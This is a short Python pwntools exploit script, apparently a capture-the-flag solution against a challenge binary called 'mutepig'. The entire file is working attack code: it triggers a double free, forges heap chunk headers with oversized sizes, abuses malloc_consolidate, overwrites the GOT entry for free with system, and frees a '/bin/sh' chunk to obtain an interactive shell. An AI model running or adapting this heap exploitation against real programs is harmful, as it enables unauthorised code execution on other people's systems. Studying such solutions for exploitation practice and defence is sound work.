from pwn import *
import time

r = process('./mutepig')
e = ELF('./mutepig')
bucket = 0x6020C0
buf = 0x602120
gap = 0.1
def malloc(choice, content):
    r.sendline('1')
    time.sleep(gap)
    r.sendline(str(choice))
    time.sleep(gap)
    r.send(content)
    time.sleep(gap)

def free(idx):
    r.sendline('2')
    time.sleep(gap)
    r.sendline(str(idx))
    time.sleep(gap)

def edit(idx, content, payload):
    r.sendline('3')
    time.sleep(gap)
    r.sendline(str(idx))
    time.sleep(gap)
    r.send(content)
    time.sleep(gap)
    r.send(payload[:0x2f])
    time.sleep(gap)

malloc(3, 'A'*7)
free(0)
malloc(3, 'A'*7)

malloc(1, 'A'*7)
malloc(1, 'A'*7)
free(2)
free(3)
free(2)

payload = p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)+p64(0)
edit(2, p64(buf+0x10)[:7], payload.ljust(0x2f, '\x00'))
malloc(1, 'A'*7)

# use malloc_consolidate
free(1)

payload = p64(0)+p64(0x11)+p64(0)+p64(0xa00001)
edit(2, p64(buf+0x10)[:7], payload)

pause()# to cut down read

malloc(3, '/bin/sh')
malloc(3, '/bin/sh')

payload = p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1)
edit(2, p64(buf+0x10)[:7], payload)

malloc(13337, 'A')
malloc(1, p64(e.got['free'])[:7])

edit(0, p64(e.plt['system'])[:7], '\x00'*0x2f)
free(6)

r.sendline('id')
r.interactive()
